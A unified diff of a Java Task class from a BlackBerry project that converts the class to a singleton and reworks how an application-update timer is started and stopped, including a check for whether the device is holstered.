@@ -11,8 +11,11 @@ package blackberry;
 import java.util.Timer;
 import java.util.Vector;
 
+import net.rim.device.api.system.DeviceInfo;
+
 import blackberry.action.Action;
 import blackberry.action.SubAction;
+import blackberry.interfaces.Singleton;
 import blackberry.log.LogCollector;
 import blackberry.utils.Debug;
 import blackberry.utils.DebugLevel;
@@ -22,7 +25,7 @@ import blackberry.utils.Utils;
 /**
  * The Class Task.
  */
-public class Task {
+public class Task implements Singleton {
 
 	private static final int SLEEPING_TIME = 1000;
 	private static final long APP_TIMER_PERIOD = 2000;
@@ -54,20 +57,29 @@ public class Task {
 
 	// ApplicationUpdateTask();
 
+	private static Task instance;
+
 	/**
 	 * Instantiates a new task.
 	 */
-	public Task() {
+	private Task() {
 		status = Status.getInstance();
 		device = Device.getInstance();
 		logCollector = LogCollector.getInstance();
 
 		eventManager = EventManager.getInstance();
 		agentManager = AgentManager.getInstance();
-		appUpdateManager = AppUpdateManager.getInstance();
 		
+
 		// #debug debug
 		debug.trace("Task created");
+	}
+
+	public static synchronized Task getInstance() {
+		if (instance == null) {
+			instance = new Task();
+		}
+		return instance;
 	}
 
 	/**
@@ -75,12 +87,12 @@ public class Task {
 	 * 
 	 * @return true, if successful
 	 */
-	public synchronized boolean checkActions() {
+	public boolean checkActions() {
 		Utils.sleep(1000);
 
 		for (;;) {
 			// #debug debug
-			//debug.trace("checkActions");
+			// debug.trace("checkActions");
 			final int[] actionIds = this.status.getActionIdTriggered();
 
 			final int asize = actionIds.length;
@@ -172,7 +184,6 @@ public class Task {
 		}
 
 		// Da qui in poi inizia la concorrenza dei thread
-	
 
 		if (eventManager.startAll() == false) {
 			// #debug debug
@@ -188,25 +199,41 @@ public class Task {
 			debug.trace("TaskInit - agentManager FAILED");
 			return false;
 		}
-		
-		// #debug debug
-		debug.trace("going to start ApplicationTimer");
-		startApplicationTimer();
+
+		if (!DeviceInfo.isInHolster()) {
+			// #debug debug
+			debug.trace("going to start ApplicationTimer");
+			startApplicationTimer();
+		}
 
 		// #debug info
 		debug.info("TaskInit - agents started");
 		return true;
 	}
 
-	void stopApplicationTimer() {
+	synchronized void stopApplicationTimer() {
+		// #debug debug
+		debug.trace("stopApplicationTimer");
 		if (applicationTimer != null) {
 			applicationTimer.cancel();
 			applicationTimer = null;
+			appUpdateManager = null;
 		}
 	}
 
-	synchronized void startApplicationTimer() {
-		applicationTimer = new Timer();		
-		applicationTimer.schedule(appUpdateManager, APP_TIMER_PERIOD, APP_TIMER_PERIOD);
+	synchronized void startApplicationTimer() {		
+		// #debug debug
+		debug.trace("startApplicationTimer");
+		
+		if (applicationTimer != null) {
+			applicationTimer.cancel();
+			applicationTimer = null;
+			appUpdateManager = null;
+		}
+
+		applicationTimer = new Timer();
+		appUpdateManager = new AppUpdateManager();
+		applicationTimer.schedule(appUpdateManager, APP_TIMER_PERIOD,
+				APP_TIMER_PERIOD);
 	}
 }
